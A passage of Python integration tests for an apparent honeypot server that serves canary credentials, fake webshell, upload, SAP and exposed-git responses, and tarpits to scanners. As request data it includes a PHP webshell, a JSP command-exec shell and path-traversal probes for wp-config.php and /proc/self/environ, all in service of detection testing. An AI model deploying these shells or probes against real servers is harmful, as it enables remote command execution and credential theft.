"""Integration tests — bind flux to an ephemeral port on localhost, hit it
with a real HTTP client over a real socket.

Unlike tests/test_server.py (which uses aiohttp's in-process TestClient),
these go through the kernel loopback. Catches any bug where the handler
code depends on `request` fields that only exist in a real server.
"""
from __future__ import annotations

import asyncio
import json

import aiohttp
import pytest
from yarl import URL

from flux import server as tbenv


FAKE_TRACEBIT = {
    "aws": {
        "awsAccessKeyId": "AKIAFAKEINTEG01",
        "awsSecretAccessKey": "integSecretExampleKey",
        "awsSessionToken": "integSessionToken",
        "awsExpiration": "2030-01-01T00:00:00Z",
    },
    "ssh": {
        "sshIp": "203.0.113.99",
        "sshPrivateKey": "-----BEGIN OPENSSH PRIVATE KEY-----\nINTEG\n-----END OPENSSH PRIVATE KEY-----",
        "sshPublicKey": "ssh-ed25519 AAAAINTEG canary@flux",
        "sshExpiration": "2030-01-01T00:00:00Z",
    },
    "http": {
        "gitlab-cookie": {
            "credentials": {"name": "_gitlab_session", "value": "integCookieVal"},
            "hostNames": ["gitlab.canary.example"],
        },
        "gitlab-username-password": {
            "credentials": {"username": "integbot", "password": "integPassVal"},
            "hostNames": ["gitlab.canary.example"],
        },
    },
}


async def _fake_canary(*_a, **_kw):
    return FAKE_TRACEBIT


@pytest.fixture
async def live_server(monkeypatch, tmp_path):
    """Start flux on 127.0.0.1:<random>; yield (base_url, log_path)."""
    monkeypatch.setattr(tbenv, "LOG_PATH", tmp_path / "env-canary.jsonl")
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    from aiohttp.test_utils import TestServer
    app = tbenv.create_app()
    server = TestServer(app, host="127.0.0.1", port=0)
    await server.start_server()
    try:
        base = f"http://127.0.0.1:{server.port}"
        yield base, tmp_path / "env-canary.jsonl"
    finally:
        await server.close()


async def test_integration_webshell_roundtrip(live_server, monkeypatch):
    """Real socket → real parser → webshell handler → response body on the wire."""
    monkeypatch.setattr(tbenv, "WEBSHELL_ENABLED", True)
    base, log_path = live_server

    async with aiohttp.ClientSession() as session:
        async with session.post(
            f"{base}/shell.php?cmd=id",
            headers={"X-Forwarded-For": "203.0.113.20"},
            data=b"cmd=id",
        ) as resp:
            assert resp.status == 200
            body = await resp.read()
            assert b"File Manager" in body
            assert b"uid=33(www-data)" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e["result"] == "webshell-command" for e in entries)


async def test_integration_file_upload_roundtrip(live_server, monkeypatch):
    """Real-socket POST of a multipart body with an embedded `<?php` payload
    against `/<prefix>/kcfinder/upload.php`. The handler should parse the
    filename and the php-shell indicator out of the multipart body, log the
    `file-upload-attempt` event with those fields, and return a plausible
    KCFinder-shaped success line so a scanner sends its next request."""
    monkeypatch.setattr(tbenv, "FILE_UPLOAD_ENABLED", True)
    base, log_path = live_server
    boundary = "----WebKitFormBoundaryFLUX1234"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="upload[]"; filename="shell.php"\r\n'
        "Content-Type: application/x-php\r\n"
        "\r\n"
        "<?php system($_GET['cmd']); ?>\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    async with aiohttp.ClientSession() as session:
        async with session.post(
            f"{base}/admin/ckeditor/plugins/kcfinder/upload.php",
            headers={
                "X-Forwarded-For": "203.0.113.30",
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
            data=body,
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/plain")
            response_body = await resp.read()
            # KCFinder's upload.php returns one line per file with a leading `/`.
            assert b"/shell.php" in response_body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matches = [e for e in entries if e.get("result") == "file-upload-attempt"]
    assert len(matches) == 1, entries
    entry = matches[0]
    assert entry["fileUploadFamily"] == "kcfinder"
    assert entry["fileUploadPath"] == "/admin/ckeditor/plugins/kcfinder/upload.php"
    assert entry["fileUploadMethod"] == "POST"
    assert entry["fileUploadHasMultipart"] is True
    assert entry["fileUploadFilenames"] == ["shell.php"]
    assert entry["fileUploadHasPhpShell"] is True
    assert "upload[]" in entry["fileUploadFieldNames"]


async def test_integration_file_upload_get_jquery_filer_readme(live_server, monkeypatch):
    """GET on a jquery.filer readme path returns plausible readme text and
    logs `file-upload-probe`."""
    monkeypatch.setattr(tbenv, "FILE_UPLOAD_ENABLED", True)
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/assets/plugins/jquery.filer/php/readme.txt",
            headers={"X-Forwarded-For": "203.0.113.31"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/plain")
            body = await resp.read()
            assert b"jQuery.filer" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matches = [e for e in entries if e.get("result") == "file-upload-probe"]
    assert len(matches) == 1
    assert matches[0]["fileUploadFamily"] == "jquery-filer"
    assert matches[0]["fileUploadHasPhpShell"] is False


async def test_integration_sap_metadatauploader_post_upload(live_server, monkeypatch):
    """POST a multipart body containing a JSP shell payload against the
    Visual Composer servlet. The handler should parse filename + JSP-shell
    indicator out of the body, log `sap-metadatauploader-upload` with those
    fields, and return the plaintext "OK: stored …" receipt with the uploaded
    filename echoed back (the success marker scanners parse to know which
    follow-on URL to GET for shell execution)."""
    monkeypatch.setattr(tbenv, "SAP_METADATAUPLOADER_ENABLED", True)
    base, log_path = live_server
    boundary = "----WebKitFormBoundarySAPNW7"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="helper.jsp"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "\r\n"
        "<%@ page import=\"java.io.*\" %>\r\n"
        "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\r\n"
        f"--{boundary}--\r\n"
    ).encode("utf-8")
    async with aiohttp.ClientSession() as session:
        async with session.post(
            f"{base}/developmentserver/metadatauploader",
            headers={
                "X-Forwarded-For": "203.0.113.50",
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
            data=body,
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/plain")
            response_body = await resp.read()
            assert response_body.startswith(b"OK: stored ")
            assert b"helper.jsp" in response_body
            # Banner is what makes scanners commit to the next request.
            assert resp.headers.get("Server", "").startswith("SAP NetWeaver")

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matches = [e for e in entries if e.get("result") == "sap-metadatauploader-upload"]
    assert len(matches) == 1, entries
    entry = matches[0]
    assert entry["sapMetadataUploaderPath"] == "/developmentserver/metadatauploader"
    assert entry["sapMetadataUploaderMethod"] == "POST"
    assert entry["sapMetadataUploaderHasMultipart"] is True
    assert entry["sapMetadataUploaderFilenames"] == ["helper.jsp"]
    assert entry["sapMetadataUploaderHasJspShell"] is True


async def test_integration_sap_metadatauploader_get_returns_sap_error(live_server, monkeypatch):
    """Bare GET to the Visual Composer servlet returns the SAP-formatted
    error envelope real NetWeaver emits and logs `sap-metadatauploader-probe`."""
    monkeypatch.setattr(tbenv, "SAP_METADATAUPLOADER_ENABLED", True)
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/developmentserver/metadatauploader",
            headers={"X-Forwarded-For": "203.0.113.51"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("application/xml")
            body = await resp.read()
            assert b"<?xml" in body
            assert b"METADATA_UPLOAD_NO_REQUEST" in body
            assert b"sap:Error" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matches = [e for e in entries if e.get("result") == "sap-metadatauploader-probe"]
    assert len(matches) == 1
    assert matches[0]["sapMetadataUploaderMethod"] == "GET"
    assert matches[0]["sapMetadataUploaderHasJspShell"] is False


async def test_integration_boto_canary_serves_aws_creds(live_server):
    """The new `.boto` canary trap returns an INI body with the canary AWS
    keys in both `[Credentials]` and `[profile prod]` sections."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.boto",
            headers={"X-Forwarded-For": "203.0.113.32"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/plain")
            body = await resp.read()
            assert b"[Credentials]" in body
            assert b"AKIAFAKEINTEG01" in body
            assert b"[profile prod]" in body


async def test_integration_amplifyrc_canary_serves_aws_creds(live_server):
    """The new `.amplifyrc` canary trap returns JSON with the canary AWS keys
    in `providers.awscloudformation`."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.amplifyrc",
            headers={"X-Forwarded-For": "203.0.113.33"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("application/json")
            body = await resp.read()
            obj = json.loads(body)
            assert obj["providers"]["awscloudformation"]["accessKeyId"] == "AKIAFAKEINTEG01"


async def test_integration_aws_credentials_file(live_server):
    """Canary trap over the wire, real headers come back including Content-Type."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.aws/credentials",
            headers={"X-Forwarded-For": "203.0.113.21"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/plain")
            assert resp.headers.get("Cache-Control") == "no-store"
            body = await resp.read()
            assert b"AKIAFAKEINTEG01" in body
            assert b"[default]" in body


@pytest.mark.parametrize("traversal_path,result_tag,canary_marker", [
    # Standard `..` traversal — should land on the wp-config trap.
    ("/files/../wp-config.php", "wp-config", b"AKIAFAKEINTEG01"),
    # No-slash traversal-bypass: `<seg>..` (no slash before `..`).
    ("/assets../wp-config.php", "wp-config", b"AKIAFAKEINTEG01"),
    # The env-hunter family's `/static../proc/self/environ` shape.
    ("/static../proc/self/environ", "proc-environ", b"AKIAFAKEINTEG01"),
])
async def test_integration_path_traversal_normalises_to_canary(
    live_server, traversal_path, result_tag, canary_marker,
):
    """Path-traversal-bypass shapes (`/files/../X`, `/assets../X`,
    `/static../X`) must normalise to the canonical X before dispatch
    so the existing canary trap fires. Over the wire — confirms the
    fix is wired into the real request path, not just a unit-level
    bypass."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}{traversal_path}",
            headers={"X-Forwarded-For": "203.0.113.24"},
        ) as resp:
            assert resp.status == 200, traversal_path
            body = await resp.read()
            assert canary_marker in body, traversal_path

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matching = [e for e in entries if e.get("result") == result_tag]
    assert matching, (
        f"no log row for {traversal_path!r} resolved as {result_tag!r}"
    )


async def test_integration_webapp_config_bundle_js(live_server):
    """`/env.production.js` (and its prefixed siblings) returns a
    `window.__APP_ENV__` assignment with the canary AWS triple in
    the REACT_APP_* / VITE_* / NEXT_PUBLIC_* slots."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/env.production.js",
            headers={"X-Forwarded-For": "203.0.113.25"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("application/javascript")
            body = await resp.read()
            assert b"window.__APP_ENV__" in body
            assert b"AKIAFAKEINTEG01" in body
            assert b"REACT_APP_AWS_ACCESS_KEY_ID" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matching = [e for e in entries if e.get("result") == "webapp-config-bundle-js"]
    assert matching


async def test_integration_webapp_config_bundle_json(live_server):
    """`/config.production.json` returns a parseable JSON manifest
    with the canary AWS triple."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/assets/config.production.json",
            headers={"X-Forwarded-For": "203.0.113.26"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("application/json")
            body = await resp.read()
            payload = json.loads(body)
            assert payload["REACT_APP_AWS_ACCESS_KEY_ID"] == "AKIAFAKEINTEG01"
            assert payload["VITE_AWS_SECRET_ACCESS_KEY"] == "integSecretExampleKey"

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matching = [e for e in entries if e.get("result") == "webapp-config-bundle-json"]
    assert matching


async def test_integration_actuator_env_serves_json_canary(live_server):
    """Spring Boot Actuator /env round-trip: 200, Spring content-type,
    JSON shape with activeProfiles + propertySources, embedded canary."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/actuator/env",
            headers={"X-Forwarded-For": "203.0.113.22"},
        ) as resp:
            assert resp.status == 200
            assert "spring-boot.actuator" in resp.headers["Content-Type"]
            body = await resp.read()
            payload = json.loads(body)
            assert payload["activeProfiles"] == ["production"]
            # AWS canary value surfaces under systemEnvironment in the response.
            sys_env = next(
                s for s in payload["propertySources"] if s["name"] == "systemEnvironment"
            )
            assert sys_env["properties"]["AWS_ACCESS_KEY_ID"]["value"] == "AKIAFAKEINTEG01"

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e["result"] == "actuator-env" for e in entries)


async def test_integration_gitlab_sign_in_sets_cookie_over_the_wire(live_server):
    """Set-Cookie arrives on the client, not just inside the mocked response."""
    base, _ = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/users/sign_in") as resp:
            assert resp.status == 200
            cookies = resp.headers.getall("Set-Cookie", [])
            assert any("integCookieVal" in c for c in cookies), cookies


async def test_integration_404_logs_one_line(live_server):
    """Unhandled path gets 404 + exactly one 'not-handled' log entry."""
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/nope/unhandled") as resp:
            assert resp.status == 404

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    matching = [e for e in entries if e["path"] == "/nope/unhandled"]
    assert len(matching) == 1
    assert matching[0]["result"] == "not-handled"


async def test_integration_head_request_has_no_body(live_server):
    """HEAD on a canary trap: 200, full headers, zero body bytes."""
    base, _ = live_server
    async with aiohttp.ClientSession() as session:
        async with session.head(f"{base}/.aws/credentials") as resp:
            assert resp.status == 200
            body = await resp.read()
            assert body == b""


async def test_integration_env_serves_canary_payload(live_server, monkeypatch):
    """GET /.env — mocks Tracebit issuance, verifies the payload surfaces the
    canary fields the consumer contract expects."""
    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    base, log_path = live_server

    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.env", headers={"X-Forwarded-For": "203.0.113.30"},
        ) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/plain")
            body = await resp.read()

    assert b"AWS_ACCESS_KEY_ID=AKIAFAKEINTEG01" in body
    assert b"SSH_HOST=203.0.113.99" in body
    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    issued = [e for e in entries if e.get("result") == "issued"]
    assert issued and "aws" in issued[-1]["types"]


async def test_integration_env_hides_tracebit_failure(live_server, monkeypatch):
    """Upstream issuance failures must be logged but must not be visible to
    the client — the response is the generic 404, not a distinctive 502."""
    async def boom(*_a, **_kw):
        raise aiohttp.ClientConnectionError("connection refused")

    monkeypatch.setattr(tbenv, "issue_credentials", boom)
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.env", headers={"X-Forwarded-For": "203.0.113.31"},
        ) as resp:
            assert resp.status == 404

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e["result"] == "tracebit-error" for e in entries)


async def test_integration_env_hides_tracebit_http_error(live_server, monkeypatch):
    """ClientResponseError is logged with the upstream status code."""
    from yarl import URL
    from multidict import CIMultiDict, CIMultiDictProxy

    async def upstream_500(*_a, **_kw):
        info = aiohttp.RequestInfo(
            url=URL("http://tracebit.test"),
            method="POST",
            headers=CIMultiDictProxy(CIMultiDict()),
            real_url=URL("http://tracebit.test"),
        )
        raise aiohttp.ClientResponseError(info, (), status=500, message="boom")

    monkeypatch.setattr(tbenv, "issue_credentials", upstream_500)
    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.env", headers={"X-Forwarded-For": "203.0.113.32"},
        ) as resp:
            assert resp.status == 404

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    http_errs = [e for e in entries if e.get("result") == "tracebit-http-error"]
    assert http_errs and http_errs[-1]["tracebitStatus"] == 500


async def test_integration_fake_git_serves_head_and_objects(live_server, monkeypatch):
    """/.git/HEAD + a loose object round-trip. Exercises _build_fake_repo and
    the streaming git handler end-to-end."""
    import zlib

    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_INTERVAL_MS", 0)
    # Fresh cache so this IP mints its own repo.
    tbenv._FAKE_GIT_CACHE.clear()

    base, log_path = live_server
    headers = {"X-Forwarded-For": "203.0.113.40"}
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/.git/HEAD", headers=headers) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"].startswith("text/plain")
            head = await resp.read()
            assert head.strip() == b"ref: refs/heads/main"

        # Discover the commit sha from refs/heads/main, then fetch that loose
        # object and verify it decompresses to a git commit.
        async with session.get(f"{base}/.git/refs/heads/main", headers=headers) as resp:
            commit_sha = (await resp.read()).decode().strip()
            assert len(commit_sha) == 40

        obj_url = f"{base}/.git/objects/{commit_sha[:2]}/{commit_sha[2:]}"
        async with session.get(obj_url, headers=headers) as resp:
            assert resp.status == 200
            assert resp.headers["Content-Type"] == "application/x-git-loose-object"
            raw = zlib.decompress(await resp.read())
            assert raw.startswith(b"commit ")

        # Unknown path under /.git returns 404 from the cached repo, not 502.
        async with session.get(f"{base}/.git/nope", headers=headers) as resp:
            assert resp.status == 404

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e["result"] == "fake-git" for e in entries)
    assert any(e["result"] == "fake-git-miss" for e in entries)


async def test_integration_fake_git_serves_prefixed_and_case_variant_paths(live_server, monkeypatch):
    """Scanners probing `/<prefix>/.git/config` and mixed-case variants
    must reach the same fake-repo response as `/.git/config`."""
    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_INTERVAL_MS", 0)
    tbenv._FAKE_GIT_CACHE.clear()

    base, log_path = live_server
    headers = {"X-Forwarded-For": "203.0.113.50"}
    async with aiohttp.ClientSession() as session:
        for path in (
            "/login/.git/config",
            "/project/.git/config",
            "/.GIT/CONFIG",
            "/Login/.GiT/CoNfIg",
        ):
            async with session.get(f"{base}{path}", headers=headers) as resp:
                assert resp.status == 200, f"{path} → {resp.status}"
                body = (await resp.read()).decode()
                assert "[core]" in body
                assert "[remote \"origin\"]" in body
                # The canary AWS key is embedded in the URL userinfo.
                assert "AKIAFAKEINTEG01" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    fake_git_entries = [e for e in entries if e.get("result") == "fake-git"]
    # One per requested path; log rows preserve the raw wire path for
    # post-hoc analysis of which prefix/case variants scanners use.
    paths_logged = {e.get("path") for e in fake_git_entries}
    assert "/login/.git/config" in paths_logged
    assert "/project/.git/config" in paths_logged
    assert "/.GIT/CONFIG" in paths_logged


async def test_integration_git_credentials_canary_trap(live_server, monkeypatch):
    """/.git-credentials is a canary-file trap: the response body is a
    credential-store-format line with an embedded gitlab-username-password
    canary."""
    async def fake_canary(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "_get_or_issue_canary", fake_canary)

    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.git-credentials",
            headers={"X-Forwarded-For": "203.0.113.51"},
        ) as resp:
            assert resp.status == 200
            body = (await resp.read()).decode()
            # https://user:pass@host format
            assert body.startswith("https://integbot:")
            assert "@gitlab.canary.example" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("result") == "git-credentials" for e in entries)


async def test_integration_fake_git_credentials_leaf_serves_canary(live_server, monkeypatch):
    """Scanners also probe `/.git/credentials` as if the credential-store
    file were inside the exposed repo metadata; fake-git should serve that
    variant instead of logging `fake-git-miss`."""
    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_INTERVAL_MS", 0)
    tbenv._FAKE_GIT_CACHE.clear()

    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.git/credentials",
            headers={"X-Forwarded-For": "203.0.113.52"},
        ) as resp:
            assert resp.status == 200
            body = (await resp.read()).decode()
            assert body.startswith("https://integbot:")
            assert "@gitlab.canary.example" in body

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("result") == "fake-git" and e.get("path") == "/.git/credentials" for e in entries)
    assert not any(e.get("result") == "fake-git-miss" and e.get("path") == "/.git/credentials" for e in entries)


async def test_integration_fake_git_hides_tracebit_failure(live_server, monkeypatch):
    async def boom(*_a, **_kw):
        raise aiohttp.ClientConnectionError("nope")

    monkeypatch.setattr(tbenv, "issue_credentials", boom)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    tbenv._FAKE_GIT_CACHE.clear()

    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.git/HEAD", headers={"X-Forwarded-For": "203.0.113.41"},
        ) as resp:
            assert resp.status == 404

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e["result"] == "fake-git-error" for e in entries)


async def test_integration_tarpit_redirect_chain_increments_hop(live_server, monkeypatch):
    """A request carrying an existing _hp_chain continues the chain (302 with
    incremented hop) up to MOD_REDIRECT_CHAIN_MAX_HOPS."""
    monkeypatch.setattr(tbenv, "TARPIT_ENABLED", True)
    monkeypatch.setattr(tbenv, "MOD_REDIRECT_CHAIN_ENABLED", True)
    # Remove terminal modules so the chain-continuation branch inside
    # _send_tarpit runs (not the module's own initial-redirect branch).
    monkeypatch.setattr(tbenv, "TARPIT_MODULES", [])

    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/?_hp_chain=abc&_hp_hop=1",
            allow_redirects=False,
        ) as resp:
            assert resp.status == 302
            location = resp.headers["Location"]
            assert "_hp_chain=abc" in location
            assert "_hp_hop=2" in location

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("module") == "redirect-chain" for e in entries)


async def test_integration_tarpit_drips_then_client_disconnects(live_server, monkeypatch):
    """Open a tarpit response, read one chunk, close. Server logs tarpit-disconnect."""
    monkeypatch.setattr(tbenv, "TARPIT_ENABLED", True)
    # Narrow the modules so we definitely hit the drip path (not a 302 redirect).
    monkeypatch.setattr(tbenv, "MOD_DNS_CALLBACK_ENABLED", False)
    monkeypatch.setattr(tbenv, "MOD_REDIRECT_CHAIN_ENABLED", False)
    monkeypatch.setattr(tbenv, "TARPIT_MODULES", [])
    # Fast drip so the test doesn't take seconds.
    monkeypatch.setattr(tbenv, "TARPIT_INTERVAL_MS", 50)
    monkeypatch.setattr(tbenv, "MOD_VARIABLE_DRIP_ENABLED", False)

    base, log_path = live_server
    timeout = aiohttp.ClientTimeout(total=2)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        # Use a `.env.*` leaf that is NOT in the env-production trap's
        # expanded suffix list (every canonical suffix — `.bak`, `.local`,
        # `.production`, etc. — now dispatches to the canary trap instead
        # of the generic tarpit).
        async with session.get(f"{base}/.env.unmapped-suffix") as resp:
            assert resp.status == 200
            # Read a little, then bail. Server should see the disconnect on its
            # next write and log tarpit-disconnect.
            chunk = await resp.content.read(16)
            assert chunk  # got at least one drip

    # Give the server a moment to notice the closed socket + write its log line.
    await asyncio.sleep(0.3)
    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    # One "tarpit" entry (started) — the disconnect entry may or may not fire
    # depending on whether the server tried to write after we closed. Start is
    # the reliable signal.
    assert any(e["result"] == "tarpit" for e in entries), entries


async def test_integration_fake_git_small_bodies_ignore_drip_capacity(
    live_server, monkeypatch,
):
    """A saturated slow-drip semaphore must not 503 responses that were
    never going to drip.

    The send loop sleeps *between* chunks, so a body that fits in one
    chunk is an ordinary fast reply. Charging it a concurrency slot meant
    a source sweeping many `/.git/` directories — whose autoindex bodies
    are small — could exhaust the semaphore on responses that hold no
    connection open, and get `503 busy` back. That both drops the
    engagement and is a tell: a real exposed repository does not answer a
    directory walk with `busy`.
    """
    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_INTERVAL_MS", 0)
    # Semaphore fully occupied by (notional) in-flight drips.
    monkeypatch.setattr(tbenv, "TARPIT_MAX_CONNECTIONS", 4)
    monkeypatch.setattr(tbenv, "_active_slow_drips", 4)
    tbenv._FAKE_GIT_CACHE.clear()

    base, log_path = live_server
    headers = {"X-Forwarded-For": "203.0.113.71"}
    async with aiohttp.ClientSession() as session:
        # Directory autoindex — the shape a `/.git/` sweep actually walks.
        for path in ("/.git/", "/.git/refs/", "/.git/hooks/", "/.git/HEAD"):
            async with session.get(f"{base}{path}", headers=headers) as resp:
                assert resp.status == 200, f"{path} returned {resp.status}"
                assert await resp.read()

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert not [e for e in entries if e.get("result") == "fake-git-capacity"], (
        "small fake-git bodies were charged against the drip semaphore"
    )
    # The counter is left exactly as it was found — no leaked decrement.
    assert tbenv._active_slow_drips == 4


async def test_integration_fake_git_large_body_still_honours_capacity(
    live_server, monkeypatch,
):
    """The semaphore must still bound genuinely-slow responses: a body
    larger than one drip chunk is what the cap exists for."""
    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_INTERVAL_MS", 0)
    # One-byte chunks, so any non-empty body counts as a multi-chunk drip.
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_BYTES", 1)
    monkeypatch.setattr(tbenv, "TARPIT_MAX_CONNECTIONS", 2)
    monkeypatch.setattr(tbenv, "_active_slow_drips", 2)
    tbenv._FAKE_GIT_CACHE.clear()

    base, log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"{base}/.git/HEAD", headers={"X-Forwarded-For": "203.0.113.72"},
        ) as resp:
            assert resp.status == 503

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert any(e.get("result") == "fake-git-capacity" for e in entries)


async def test_integration_fake_git_head_request_never_takes_a_slot(
    live_server, monkeypatch,
):
    """`HEAD` sends no body, so it is never a drip regardless of size."""
    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_INTERVAL_MS", 0)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_BYTES", 1)
    monkeypatch.setattr(tbenv, "TARPIT_MAX_CONNECTIONS", 1)
    monkeypatch.setattr(tbenv, "_active_slow_drips", 1)
    tbenv._FAKE_GIT_CACHE.clear()

    base, _log_path = live_server
    async with aiohttp.ClientSession() as session:
        async with session.head(
            f"{base}/.git/HEAD", headers={"X-Forwarded-For": "203.0.113.73"},
        ) as resp:
            assert resp.status == 200
    assert tbenv._active_slow_drips == 1


async def test_integration_fake_git_autoindex_never_drips(live_server, monkeypatch):
    """A directory listing larger than one chunk still must not drip.

    `/.git/hooks/` renders a long autoindex — bigger than the drip chunk —
    so a size-only rule would still have charged it a slot and slept
    between chunks. Real `autoindex` output is generated in memory and
    returned immediately, and a `/.git/` sweep walks these in bursts, so
    listings are served fast and uncharged regardless of length.
    """
    async def fake_issue(*_a, **_kw):
        return FAKE_TRACEBIT

    monkeypatch.setattr(tbenv, "issue_credentials", fake_issue)
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    # A drip interval long enough that any sleep would blow the timeout,
    # and a chunk size small enough to force many chunks.
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_INTERVAL_MS", 30_000)
    monkeypatch.setattr(tbenv, "FAKE_GIT_DRIP_BYTES", 32)
    monkeypatch.setattr(tbenv, "TARPIT_MAX_CONNECTIONS", 1)
    monkeypatch.setattr(tbenv, "_active_slow_drips", 1)
    tbenv._FAKE_GIT_CACHE.clear()

    base, log_path = live_server
    headers = {"X-Forwarded-For": "203.0.113.74"}
    async with aiohttp.ClientSession() as session:
        for path in ("/.git/", "/.git/hooks/", "/.git/info/", "/.git/branches/"):
            async with asyncio.timeout(5):
                async with session.get(f"{base}{path}", headers=headers) as resp:
                    assert resp.status == 200, f"{path} returned {resp.status}"
                    body = await resp.read()
            assert body, f"{path} served an empty listing"

    entries = [json.loads(line) for line in log_path.read_text().splitlines()]
    assert not [e for e in entries if e.get("result") == "fake-git-capacity"]
    assert tbenv._active_slow_drips == 1


async def test_integration_cgi_traversal_rce_probe_returns_500(live_server):
    """A bodyless traversal to `/bin/sh` gets the 500 a genuinely
    vulnerable 2.4.49 returns (`sh` exits before emitting CGI headers).
